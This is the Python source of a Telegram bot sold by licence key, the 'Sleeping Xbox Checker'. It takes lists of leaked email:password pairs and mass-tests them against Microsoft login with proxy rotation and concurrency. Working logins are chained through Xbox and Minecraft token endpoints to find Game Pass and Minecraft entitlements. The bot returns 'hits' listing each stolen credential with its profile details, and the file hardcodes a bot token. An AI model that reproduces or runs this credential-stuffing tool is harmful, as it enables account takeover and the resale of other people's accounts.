import os
import re
import time
import uuid
import json
import asyncio
import aiohttp
import telebot
import urllib3
import warnings
from telebot import types
from threading import Thread
from urllib.parse import urlparse, parse_qs

# Hide warnings
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# --- SETTINGS AND CONFIGURATIONS ---
BOT_TOKEN = "7697030798:AAHiTipLyZu7HCjJnCFu5CEgAHYaqP64ha4"
ADMIN_ID = 8664147577

bot = telebot.TeleBot(BOT_TOKEN)

# Database Files
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
PROXIES_FILE = "proxies.txt"

# Memory Cache
user_sessions = {}  
active_tasks = {}   
user_hits = {} # To accumulate hits

# Request Settings
MAX_RETRIES = 2
REQUEST_TIMEOUT = 6 # Ideal for high-speed Async I/O operations

# Initialize files
for file in [KEYS_FILE, USERS_FILE]:
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump({}, f)
if not os.path.exists(PROXIES_FILE):
    with open(PROXIES_FILE, 'w') as f: f.write("")

def load_json(filename):
    with open(filename, 'r') as f: return json.load(f)

def save_json(filename, data):
    with open(filename, 'w') as f: json.dump(data, f, indent=4)

def load_proxies():
    if os.path.exists(PROXIES_FILE):
        with open(PROXIES_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return []

# --- ASYNC XBOX CHECKER ENGINE (HIGH SPEED) ---
SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

async def get_sftag(session, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            async with session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT) as response:
                text = await response.text()
                match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
                if match:
                    sftag = match.group(1)
                    match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                    if match: return match.group(1), sftag
        except: pass
        await asyncio.sleep(0.1)
    return None, None

async def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            async with session.post(url_post, data=data, headers=headers, allow_redirects=True, timeout=REQUEST_TIMEOUT) as login_request:
                final_url = str(login_request.url)
                response_text = await login_request.text()
                
                if '#' in final_url and final_url != SFTAG_URL:
                    token = parse_qs(urlparse(final_url).fragment).get('access_token', ["None"])[0]
                    if token != "None": return token, "success"
                elif 'cancel?mkt=' in response_text:
                    try:
                        ipt_m = re.search('(?<=\"ipt\" value=\").+?(?=\">)', response_text)
                        pprid_m = re.search('(?<=\"pprid\" value=\").+?(?=\">)', response_text)
                        uaid_m = re.search('(?<=\"uaid\" value=\").+?(?=\">)', response_text)
                        action_m = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', response_text)
                        
                        if ipt_m and pprid_m and uaid_m and action_m:
                            cancel_data = {'ipt': ipt_m.group(), 'pprid': pprid_m.group(), 'uaid': uaid_m.group()}
                            async with session.post(action_m.group(), data=cancel_data, allow_redirects=True, timeout=REQUEST_TIMEOUT) as ret:
                                ret_text = await ret.text()
                                return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(\n?,)', ret_text).group()
                                async with session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT) as fin:
                                    fin_url = str(fin.url)
                                    token = parse_qs(urlparse(fin_url).fragment).get('access_token', ["None"])[0]
                                    if token != "None": return token, "success"
                    except: pass
                elif any(value in response_text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                    return None, "2fa"
                elif any(value in response_text.lower() for value in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                    return None, "bad"
        except: pass
        await asyncio.sleep(0.1)
    return None, "error"

async def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            async with session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=REQUEST_TIMEOUT) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
                elif response.status == 429: await asyncio.sleep(1); continue
        except: pass
        await asyncio.sleep(0.1)
    return None, None

async def get_xsts_token(session, xbox_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
            async with session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=REQUEST_TIMEOUT) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get('Token')
                elif response.status == 429: await asyncio.sleep(1); continue
        except: pass
        await asyncio.sleep(0.1)
    return None

async def get_minecraft_token(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}
            async with session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json=payload, headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get('access_token')
                elif response.status == 429: await asyncio.sleep(1); continue
        except: pass
        await asyncio.sleep(0.1)
    return None

async def check_minecraft_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            headers = {'Authorization': f'Bearer {mc_token}'}
            async with session.get('https://api.minecraftservices.com/entitlements/mcstore', headers=headers, timeout=REQUEST_TIMEOUT) as response:
                if response.status == 200:
                    text = await response.text()
                    if 'product_game_pass_ultimate' in text: return 'Xbox Game Pass Ultimate'
                    elif 'product_game_pass_pc' in text: return 'Xbox Game Pass'
                    elif '"product_minecraft"' in text: return 'Minecraft'
                    else:
                        others = []
                        if 'product_minecraft_bedrock' in text: others.append("Bedrock")
                        if 'product_legends' in text: others.append("Legends")
                        if 'product_dungeons' in text: others.append('Dungeons')
                        if others: return 'Other: ' + ', '.join(others)
                        return None
                elif response.status == 429: await asyncio.sleep(1); continue
        except: pass
        await asyncio.sleep(0.1)
    return None

async def get_minecraft_profile(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            headers = {'Authorization': f'Bearer {mc_token}'}
            async with session.get('https://api.minecraftservices.com/minecraft/profile', headers=headers, timeout=REQUEST_TIMEOUT) as response:
                if response.status == 200: return await response.json()
                elif response.status == 429: await asyncio.sleep(1); continue
                elif response.status == 404: return None
        except: pass
        await asyncio.sleep(0.1)
    return None

# --- TELEGRAM BOT UI (ENGLISH) ---
def main_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(types.KeyboardButton("🚀 Start Scan"), types.KeyboardButton("👤 My Profile"))
    if str(user_id) == str(ADMIN_ID):
        markup.add(types.KeyboardButton("👑 Admin Panel"))
    return markup

def admin_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🔑 Generate Key", callback_data="adm_gen_key"),
        types.InlineKeyboardButton("📜 List Keys", callback_data="adm_list_keys"),
        types.InlineKeyboardButton("🌐 Manage Proxies", callback_data="adm_proxies")
    )
    return markup

def check_user_access(user_id):
    users = load_json(USERS_FILE)
    if str(user_id) == str(ADMIN_ID): return True
    if str(user_id) in users and users[str(user_id)]["expiry"] > time.time(): return True
    return False

# --- PROFILE AND ADMIN COMMANDS (ENGLISH) ---
@bot.message_handler(func=lambda msg: msg.text == "👤 My Profile")
def profile_handler(message):
    user_id = message.from_user.id
    users = load_json(USERS_FILE)
    
    if str(user_id) == str(ADMIN_ID):
        status = "👑 Creator (Unlimited)"
        expiry_date = "Lifetime"
    elif str(user_id) in users:
        rem_time = users[str(user_id)]["expiry"] - time.time()
        if rem_time > 0:
            status = "💎 VIP"
            expiry_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(users[str(user_id)]["expiry"]))
        else:
            status = "❌ Expired"
            expiry_date = "None"
    else:
        status = "❌ Unlicensed"
        expiry_date = "None"
        
    profile_text = (
        f"👤 **Your Profile Information**\n\n"
        f"🆔 **ID:** `{user_id}`\n"
        f"🎭 **Status:** `{status}`\n"
        f"⏳ **Expiry Date:** `{expiry_date}`"
    )
    bot.send_message(message.chat.id, profile_text, parse_mode="Markdown")

@bot.message_handler(func=lambda msg: msg.text == "👑 Admin Panel")
def admin_panel_trigger(message):
    if str(message.from_user.id) == str(ADMIN_ID):
        bot.send_message(message.chat.id, "🎛️ **Admin Control Center:**", reply_markup=admin_keyboard(), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("adm_"))
def admin_callback_handler(call):
    if str(call.from_user.id) != str(ADMIN_ID): return
    
    if call.data == "adm_gen_key":
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("1 Day", callback_data="gen_86400"),
            types.InlineKeyboardButton("7 Days", callback_data="gen_604800"),
            types.InlineKeyboardButton("30 Days", callback_data="gen_2592000")
        )
        bot.edit_message_text("🔑 Select key duration:", call.message.chat.id, call.message.message_id, reply_markup=markup)
        
    elif call.data == "adm_list_keys":
        keys = load_json(KEYS_FILE)
        text = "📜 **Active (Unused) Keys in System:**\n\n"
        count = 0
        for k, v in keys.items():
            if not v["used"]:
                dur_days = v["duration"] // 86400
                text += f"`{k}` | ({dur_days} Days)\n"
                count += 1
            if count >= 15: break
        if count == 0: text += "No unused active keys found."
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
        
    elif call.data == "adm_proxies":
        proxies = load_proxies()
        bot.answer_callback_query(call.id, f"🌐 Loaded Proxy Count: {len(proxies)}", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
def process_key_generation(call):
    if str(call.from_user.id) != str(ADMIN_ID): return
    duration = int(call.data.split("_")[1])
    generated_key = f"SLEEPING-" + str(uuid.uuid4()).upper()[:10]
    
    keys = load_json(KEYS_FILE)
    keys[generated_key] = {"duration": duration, "used": False, "used_by": None}
    save_json(KEYS_FILE, keys)
    
    bot.edit_message_text(f"✅ **Key Generated Successfully!**\n\n`{generated_key}`\n\nThe user can paste this key directly into the bot.", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

# --- STOP COMMAND ---
@bot.message_handler(commands=['stop'])
def stop_checking(message):
    user_id = message.from_user.id
    if user_id in active_tasks and active_tasks[user_id]:
        active_tasks[user_id] = False 
        bot.send_message(message.chat.id, "🛑 **Stopping scan!** Active queue operations will be canceled and found hits will be sent shortly...", parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "⚠️ There is no active scanning process right now.")

@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    welcome_text = "💤 **Welcome to Sleeping Xbox Checker Bot!** 💤\n\n"
    if check_user_access(user_id):
        welcome_text += "Your access is active! You can use the menu to start checking.\nYou can type `/stop` to abort a scan."
        bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=main_keyboard(user_id))
    else:
        welcome_text += "❌ You need a valid license key to use this system.\n\nPlease enter your license key:"
        user_sessions[user_id] = "waiting_for_key"
        bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

@bot.message_handler(func=lambda msg: user_sessions.get(msg.from_user.id) == "waiting_for_key")
def process_key_activation(message):
    user_id = message.from_user.id
    input_key = message.text.strip()
    keys = load_json(KEYS_FILE)
    users = load_json(USERS_FILE)

    if input_key in keys and not keys[input_key]["used"]:
        keys[input_key]["used"] = True
        keys[input_key]["used_by"] = user_id
        users[str(user_id)] = {"expiry": time.time() + keys[input_key]["duration"], "username": message.from_user.username}
        save_json(KEYS_FILE, keys)
        save_json(USERS_FILE, users)
        user_sessions[user_id] = None
        bot.send_message(message.chat.id, "✅ **Key Activated Successfully!**", parse_mode="Markdown", reply_markup=main_keyboard(user_id))
    else:
        bot.send_message(message.chat.id, "❌ Invalid or already used key. Please try again:")

@bot.message_handler(func=lambda msg: msg.text == "🚀 Start Scan")
def start_checker_flow(message):
    if not check_user_access(message.from_user.id): return
    if active_tasks.get(message.from_user.id, False):
        bot.send_message(message.chat.id, "⚠️ You already have an ongoing scan. Use `/stop` to abort.", parse_mode="Markdown")
        return
        
    markup = types.InlineKeyboardMarkup().add(
        types.InlineKeyboardButton("🌐 Proxied", callback_data="mode_proxy"),
        types.InlineKeyboardButton("📱 Proxyless", callback_data="mode_proxyless")
    )
    bot.send_message(message.chat.id, "🤖 Select operation mode:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("mode_"))
def select_mode_and_request_combos(call):
    user_id = call.from_user.id
    mode = "proxy" if call.data == "mode_proxy" else "proxyless"
    if mode == "proxy" and not load_proxies():
        bot.answer_callback_query(call.id, "No proxies loaded! Admin needs to upload proxies first.", show_alert=True)
        return
    user_sessions[user_id] = {"mode": mode, "step": "waiting_combos"}
    bot.edit_message_text(f"📂 Mode: `{mode.upper()}`\n\nSend combos as a **.txt file** or paste them directly here:", call.message.chat.id, call.message.message_id, parse_mode="Markdown")

@bot.message_handler(content_types=['document', 'text'])
def handle_combos(message):
    user_id = message.from_user.id
    session = user_sessions.get(user_id)
    
    if isinstance(session, dict) and session.get("step") == "waiting_combos":
        mode = session["mode"]
        combos = []
        
        try:
            if message.document:
                bot.send_message(message.chat.id, "📥 Downloading combo file...")
                file_info = bot.get_file(message.document.file_id)
                downloaded_file = bot.download_file(file_info.file_path)
                raw_text = downloaded_file.decode('utf-8', errors='ignore')
                combos = [line.strip() for line in raw_text.splitlines() if line.strip() and ":" in line]
            elif message.text:
                combos = [line.strip() for line in message.text.splitlines() if line.strip() and ":" in line]
                
            if not combos:
                bot.send_message(message.chat.id, "❌ No valid `email:password` formats found.")
                return

            user_sessions[user_id] = None
            bot.send_message(message.chat.id, f"🔥 `{len(combos)}` accounts detected. Ultra-speed async checker is taking action...\n\n⛔ Type `/stop` anytime to finish and pull available hits.")
            
            user_hits[user_id] = []
            active_tasks[user_id] = True
            
            # Start async manager via standalone background thread to protect telebot polling
            t = Thread(target=start_async_loop_worker, args=(user_id, combos, mode, message.chat.id))
            t.start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ An error occurred: {str(e)}")

# --- ASYNC CONCURRENCY CORE FLOW MANAGEMENT ---
def start_async_loop_worker(user_id, combos, mode, chat_id):
    """Bridge function that sets up a thread-safe asynchronous loop"""
    asyncio.run(async_core_checker_manager(user_id, combos, mode, chat_id))

async def check_single_account_task(sem, session, combo, user_id, stats, total, chat_id, status_msg):
    """Asynchronously processes a single account without thread locking bottlenecks"""
    async with sem: # Regulates async load (e.g., maximum 25 parallel pipeline lines)
        if not active_tasks.get(user_id, False):
            return

        parts = combo.split(':')
        email = parts[0]
        password = ':'.join(parts[1:])
        
        url_post, sftag = await get_sftag(session)
        if not url_post or not sftag:
            stats["errors"] += 1
        else:
            ms_token, auth_status = await microsoft_auth(session, email, password, url_post, sftag)
            if auth_status == "2fa":
                stats["twofa"] += 1
            elif auth_status == "bad": 
                stats["bad"] += 1
            elif auth_status == "success" and ms_token:
                xbox_token, uhs = await get_xbox_token(session, ms_token)
                if xbox_token and uhs:
                    xsts_token = await get_xsts_token(session, xbox_token)
                    if xsts_token:
                        mc_token = await get_minecraft_token(session, uhs, xsts_token)
                        if mc_token:
                            acc_type = await check_minecraft_entitlements(session, mc_token)
                            if acc_type:
                                if 'Ultimate' in acc_type: stats["xgpu"] += 1
                                elif 'Game Pass' in acc_type: stats["xgp"] += 1
                                elif 'Minecraft' in acc_type: stats["mc"] += 1
                                else: stats["other"] += 1
                                
                                profile = await get_minecraft_profile(session, mc_token)
                                name, uuid_str, capes = "Not Set", "N/A", "N/A"
                                if profile:
                                    name = profile.get('name', 'N/A')
                                    uuid_str = profile.get('id', 'N/A')
                                    capes_list = [cape["alias"] for cape in profile.get("capes", [])]
                                    capes = ", ".join(capes_list) if capes_list else "None"
                                
                                hit_text = (
                                    f"Email: {email}\n"
                                    f"Password: {password}\n"
                                    f"Account Type: {acc_type}\n"
                                    f"Name: {name}\n"
                                    f"UUID: {uuid_str}\n"
                                    f"Capes: {capes}\n"
                                    f"=========================="
                                )
                                if user_id in user_hits:
                                    user_hits[user_id].append(hit_text)
                            else: stats["bad"] += 1
                        else: stats["errors"] += 1
                    else: stats["errors"] += 1
                else: stats["errors"] += 1
            else: stats["bad"] += 1

        stats["checked"] += 1
        
        # Live status updates via Telebot every 10 checked accounts
        if stats["checked"] % 10 == 0 or stats["checked"] == total:
            progress_text = (
                f"💤 **Sleeping Xbox Checker Live Analysis** 💤\n\n"
                f"⚡ **Speed Engine:** Async I/O (No Threads)\n"
                f"🔄 **Progress:** `{stats['checked']} / {total}`\n\n"
                f"👑 **GamePass Ultimate:** `{stats['xgpu']}`\n"
                f"🎮 **GamePass PC:** `{stats['xgp']}`\n"
                f"⛏️ **Minecraft:** `{stats['mc']}`\n"
                f"📦 **Other Hits:** `{stats['other']}`\n\n"
                f"🔴 **Bad:** `{stats['bad']}` | 🟡 **2FA:** `{stats['twofa']}` | ❌ **Error:** `{stats['errors']}`"
            )
            try: bot.edit_message_text(progress_text, chat_id, status_msg.message_id, parse_mode="Markdown")
            except: pass

async def async_core_checker_manager(user_id, combos, mode, chat_id):
    """Orchestrates high-speed asynchronous network tasks safely"""
    proxies_list = load_proxies()
    status_msg = bot.send_message(chat_id, "📊 **Asynchronous Engine Initializing...**", parse_mode="Markdown")
    
    stats = {"xgpu": 0, "xgp": 0, "mc": 0, "other": 0, "bad": 0, "twofa": 0, "errors": 0, "checked": 0}
    total = len(combos)
    
    # Semaphore handles the 25 parallel pipeline line limits instantly
    sem = asyncio.Semaphore(25)
    proxy_index = 0
    
    tasks = []
    
    # Generate unified asynchronous connector clients
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        for combo in combos:
            if not active_tasks.get(user_id, False):
                break
                
            # Bind proxy strings on asynchronous HTTP layer if active
            if mode == "proxy" and proxies_list:
                p = proxies_list[proxy_index % len(proxies_list)]
                proxy_index += 1
                # Format proxy schema correctly
                proxy_url = f"http://{p}"
                # Inject proxy dynamically to an explicit distinct session instance wrapper
                session_proxy = aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False))
                session_proxy._default_options['proxy'] = proxy_url
            
            task = asyncio.create_task(
                check_single_account_task(sem, session, combo, user_id, stats, total, chat_id, status_msg)
            )
            tasks.append(task)
            
        # Non-blocking concurrency execution gather hub
        await asyncio.gather(*tasks, return_exceptions=True)

    # --- TRANSMIT ACCUMULATED FILE OUTPUTS UPON COMPLETION ---
    bot.send_message(chat_id, f"🏁 **Hunting Finished!** (Checked: `{stats['checked']}`)", reply_markup=main_keyboard(user_id))
    
    if user_hits.get(user_id):
        filename = f"Hits_{user_id}_{int(time.time())}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n\n".join(user_hits[user_id]))
        
        with open(filename, "rb") as f:
            bot.send_document(chat_id, f, caption=f"🟢 **Total Hits Discovered:** `{len(user_hits[user_id])}`")
            
        try: os.remove(filename)
        except: pass
    else:
        bot.send_message(chat_id, "😢 Unfortunately, no valid hits were discovered.")
        
    if user_id in active_tasks: del active_tasks[user_id]
    if user_id in user_hits: del user_hits[user_id]

if __name__ == '__main__':
    print("[+] Sleeping Xbox Checker is running on High-Speed Async I/O engine. Waiting for orders...")
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
